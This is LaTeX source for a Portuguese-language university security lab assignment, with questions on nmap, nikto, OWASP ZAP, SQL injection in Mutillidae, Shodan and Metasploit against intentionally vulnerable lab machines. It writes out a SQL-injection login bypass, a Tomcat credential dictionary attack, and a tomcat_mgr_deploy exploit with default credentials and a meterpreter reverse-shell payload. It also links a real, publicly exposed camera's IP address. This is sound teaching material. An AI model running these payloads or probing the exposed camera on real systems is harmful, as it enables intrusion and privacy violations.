%-------------------------------------------------------------------------------
\documentclass{article}

%-------------------------------------------------------------------------------
% Packages

% Translation
\usepackage[brazilian]{babel}

% General
\usepackage{amsmath}
\usepackage{environ}
\usepackage{graphicx}
\usepackage[margin=1in]{geometry}
\usepackage{minted}
\usepackage{xcolor}

% To-do List
\usepackage{amssymb}
\usepackage{pifont}
\usepackage{enumitem}

% Other
\usepackage{hyperref}
\usepackage[brazilian]{cleveref} % Must be after hyperref


% Custom lists
\newlist{todolist}{itemize}{2}
\setlist[todolist]{label=$\square$}
\newcommand{\done}{%
    \rlap{$\square$}{%
        \raisebox{2pt}{\large\hspace{1pt}\ding{51}
    }}\hspace{-2.5pt}
}

%-------------------------------------------------------------------------------
% User-commands
\newcommand{\todo}[1]{{\color{red}{#1}}}

\newcommand{\code}[1]{\texttt{#1}}
\newcommand{\img}[1]{%
    \includegraphics[width=1\textwidth, height=1\textheight, keepaspectratio]{#1}
}

\NewEnviron{superframe}{%
    \begin{center}
        \fbox{\setlength{\fboxsep}{1em}\fbox{\parbox{5.5in}{%
            \BODY{}
        }}}
    \end{center}
}

\NewEnviron{answer}{%
    \begin{samepage}
        \begin{solution}
            \BODY{}
        \end{solution}
    \end{samepage}
}

\renewcommand{\thesection}{Parte \arabic{section}.}

%-------------------------------------------------------------------------------
% Project configs
\title{%
    Segurança em Computação \\
    Trabalho Individual IV
}
\author{João Paulo Taylor Ienczak Zanette}
\date{\today}

%------------------------------------------------------------------------------
\begin{document}
    \maketitle{}

    %--------------------------------------------------------------------------
    \section{Usando o NMAP}

    \begin{superframe}
        Copie e cole screenshots de telas obtidas na execução dos comandos.
        Explique brevemente a saída obtida em cada um dos comandos das questões
        1, 2, 3 e 4.

        \begin{enumerate}
            \item \texttt{nmap -sV -O 10.1.2.6};

                A flag \code{-sV} indica para o \code{nmap} fazer uma busca por
                serviços (e suas respectivas versões) em cada porta aberta no
                \textit{host} 10.1.2.6. A flag \code{-O} serve para tentar
                identificar qual o SO do \textit{host} especificado.

                \img{imgs/q1-1.png}

            \item \texttt{nmap -v -A 10.1.2.6};

            \item \texttt{nmap -sS -v --top-ports 10 --reason -oA saidanmap
                www.ufsc.br};
            \item Crie um comando com opções diferentes das usadas nas questões
                anteriores e explique a saída obtida pelo seu comando.
            \item Responda:
                \begin{enumerate}
                    \item Qual a diferença entre um scan de conexão TCP e um
                        SYN scan?
                    \item Qual questão anterior usa scan de conexão TCP e qual
                        questão usa SYN scan?
                    \item Comente pelo menos uma vulnerabilidade da máquina
                        Owasp Broken, listando a identificação CVE
                        (\url{cve.mitre.org}) da vulnerabilidade.
                \end{enumerate}
        \end{enumerate}
    \end{superframe}

    %--------------------------------------------------------------------------
    \section{Nikto}

    \begin{superframe}
        \begin{enumerate}
            \setcounter{enumi}{5}
            \item Execute o comando \texttt{nikto -host http://10.1.2.6/Wacko -o nikto.html -format htm}.
                \begin{enumerate}
                    \item Copie e cole screenshots de telas obtidas na execução do
                        comando;
                    \item Explique o que mais chamou sua atenção na saída obtida.
                        Explique também alguma vulnerabilidade encontrada nessa
                        aplicação (WackoPicko) que consta no relatório do arquivo
                        muti.html.
                \end{enumerate}
        \end{enumerate}
    \end{superframe}

    %--------------------------------------------------------------------------
    \section{OWASP}

    \begin{superframe}
        \begin{enumerate}
            \setcounter{enumi}{6}
            \item Explique as vulnerabilidades A1, A2, A3 e A7 do documento TOP
                TEN 2017:
                \url{https://www.owasp.org/images/7/72/OWASP_Top_10-2017_$28en$29.pdf.pdf};
            \item Faça:
                \begin{enumerate}
                    \item Acesse a aplicação Mutillidae: abra o browser da sua
                        máquina real ou na Kali Linux no site \url{http://<IP
                        da Kali>/mutillidae} e clique em Login. No campo
                        Username, digite \texttt{' or 1=1 -- }. O campo
                        password pode ficar em branco. Copie e cole a tela do
                        seu experimento;
                    \item Explique o resultado obtido e a vulnerabilidade
                        explorada no experimento (pesquise no documento do TOP
                        10 da OWASP);
                    \item O que pode ser feito para impedir a exploração dessa
                        vulnerabilidade?
                    \item Clique em Logout.
                \end{enumerate}
            \item Repita a inserção da mesma string anterior no seguinte link:
                \url{http://<IP da Kali>/mutillidae/index.php?page=user-info.php};
                \begin{enumerate}
                    \item Explique a vulnerabilidade explorada no experimento
                        (pesquise no documento do TOP 10 da OWASP);
                    \item Copie e cole um screenshot da execução de um
                        experimento;
                    \item O que pode ser feito para impedir a exploração dessa
                        vulnerabilidade?
                \end{enumerate}
            \item Você deve utilizar a ferramenta OWASP ZAP (Zed Attack Proxy)
                da Kali Linux. As ferramentas de scan de web são encontradas no
                menu Kali-Linux -> O3 --- Web Application Analysis ->
                owasp-zap. Faça um scan das vulnerabilidades da aplicação
                WackoPicko da máquina OWASP Broken usando a ferramenta. Faça:
                \begin{enumerate}
                    \item Coloque a URL da aplicação --- \url{http://<IP da
                        OWASP>/WackoPicko} --- e clique em ``Attack''. A
                        análise básica é iniciada. Demora um pouco (de 8 a 10
                        minutos) e você deve salvar o relatório geral do
                        processo (opção Report -> Generate HTML Report). Os
                        alertas (aba Alerts) vão listando as vulnerabilidades
                        encontradas. Na aba Active Scan é possível ver os
                        requests sendo enviados.
                    \item Comente o experimento e os resultados alcançados.
                \end{enumerate}
            \item Observe a lista de vulnerabilidades da aplicação Mutillidae
                disponível em \url{http://<IP da
                Kali>/mutillidae/index.php?page=./documentation/vulnerabilities.php}.
                Agora você deve escolher duas vulnerabilidades do TOP 10 2017
                da lista da OWASP e criar uma forma de ataque para cada uma das
                vulnerabilidades escolhidas. Assim, você deve criar dois
                ataques (devem ser diferentes dos ataques das questões 8 e 9).
                Documente os experimentos e mostre funcionando na apresentação.
                Na apresentação você também deve explicar as vulnerabilidades.
        \end{enumerate}
    \end{superframe}

    \section{Vulnerabilidades em IoT}

    \begin{superframe}
        \begin{enumerate}
            \setcounter{enumi}{11}
            \item Leia a reportagem com título ``Find webcams, databases, boats
                in the sea using Shodan'' disponível em
                \url{https://www.securitynewspaper.com/2018/11/27/find-webcams-databases-boats-in-the-sea-using-shodan/}.
                Responda:

                \begin{enumerate}
                    \item O que é o Shodan e o que é possível fazer com esse
                        site?
                    \item (Apresentação) Faça o registro no site, pesquise e
                        liste algum dispositivo IoT que você encontrou.
                \end{enumerate}

        \item Conforme descrito na reportagem, acesse o link
            \url{http://166.161.197.253:5001/cgi-bin/guestimage.html}. É uma
            câmera Mobotix. Responda:
            \begin{enumerate}
                \item O que é possível visualizar?
                \item Um atacante poderia fazer o que com este acesso?
            \end{enumerate}
        \end{enumerate}
    \end{superframe}

    \section{Metasploit}

    \subsection{%
        Usando o Metasploit para explorar o TOMCAT na máquina Owasp Broken
    }

    O servidor Apache Tomcat é um servidor web Java.

    \begin{minted}{console}
        msf > search tomcat
    \end{minted}

    Com o comando search tomcat é possível identificar os exploits disponíveis.
    Procure o nome do módulo:

    \begin{minted}{text}
        Name ... Description
        auxiliary/scanner/http/tomcat_mgr_login ... Tomcat Application Manager Login Utility
    \end{minted}

    Para usar este módulo digite:

    \begin{minted}{console}
        msf > use auxiliary/scanner/http/tomcat_mgr_login
        msf > show options
    \end{minted}

    As opções mostram o que pode ser configurado para usar o módulo escolhido.
    Nem tudo precisa ser configurado.

    Digite os comandos abaixo. Copie e cole o screenshot da sua tela no
    relatório da tarefa ao realizar o experimento:

    \begin{minted}{console}
        msf auxiliary(tomcat_mgr_login) > set RHOSTS 10.1.2.6
        msf auxiliary(tomcat_mgr_login) > set RPORT 8080 (Porta do Tomcat)
        msf auxiliary(tomcat_mgr_login) > exploit
    \end{minted}

    Este módulo executa um ataque do dicionário, utilizando os arquivos
    indicados nas variáveis indicadas acima. Neste ataque uma das combinações
    utilizadas poderá ser aceita pelo servidor.

    \begin{superframe}
        \begin{enumerate}
            \setcounter{enumi}{13}
            \item Copie e cole a screenshot da sua tela ao realizar o
                experimento anterior. Depois, explique o experimento:

                \begin{enumerate}
                    \item O que é o ataque do dicionário?
                    \item O que foi encontrado?
                    \item Qual foi a vulnerabilidade usada para obter esse
                        resultado?
                    \item Como pode ser explorado esse resultado?
                \end{enumerate}
        \end{enumerate}
    \end{superframe}

    O \code{tomcat\_mgr\_deploy} pode usar diferentes payloads. O payload
    identifica o código que o módulo deve executar e que deve ser entregue ao
    alvo.

    \begin{minted}{console}
        msf exploit(tomcat_mgr_deploy) > show payloads
    \end{minted}

    Digite os comandos:

    \begin{minted}{console}
        msf > use exploit/multi/http/tomcat_mgr_deploy
        msf exploit(tomcat_mgr_deploy) > set RHOSTS x.x.x.x (IP da máquina Owasp)
        msf exploit(tomcat_mgr_deploy) > set HttpUsername root
        msf exploit(tomcat_mgr_deploy) > set HttpPassword owaspbwa
        msf exploit(tomcat_mgr_deploy) > set RPORT 8080
        msf exploit(tomcat_mgr_deploy) > show options
        msf exploit(tomcat_mgr_deploy) > show payloads
        msf exploit(tomcat_mgr_deploy) > set payload java/meterpreter/reverse_tcp
        msf exploit(tomcat_mgr_deploy) > show options
        msf exploit(tomcat_mgr_deploy) > set LHOST 10.1.2.7 -> colocar IP da Kali
        msf exploit(tomcat_mgr_deploy) > exploit
    \end{minted}

    Nesse prompt (meterpreter) podem ser executados comandos. Ao conseguir
    chegar no prompt do meterpreter você está com um tipo de shell na máquina
    alvo. Digite help no prompt do meterpreter para listar os comandos
    possíveis que poderão ser executados.

    \begin{superframe}
        \begin{enumerate}
            \setcounter{enumi}{14}
            \item Copie e cole a screenshot da sua tela de estabelecimento de
                sessão (inclua na imagem a parte dos IPs, data e hora dos
                experimentos). Agora, explique os experimentos respondendo
                perguntas:

            \begin{enumerate}
                \item Qual a vulnerabilidade que está sendo explorada?
                \item O que faz o exploit para explorar a vulnerabilidade?
                \item O que é o meterpreter?
                \item O que é possível fazer depois que o exploit é executado?
                    Use pelo menos dois comandos do meterpeter listados com o
                    comando help e explique cada um deles, colocando a imagem
                    da execução dos seus comandos. Alguns comandos para
                    máquinas Windows não funcionarão na máquina Linux.
            \end{enumerate}
        \end{enumerate}
    \end{superframe}

    Sequência de meterpreters:

    --- ps
    ---
\end{document}
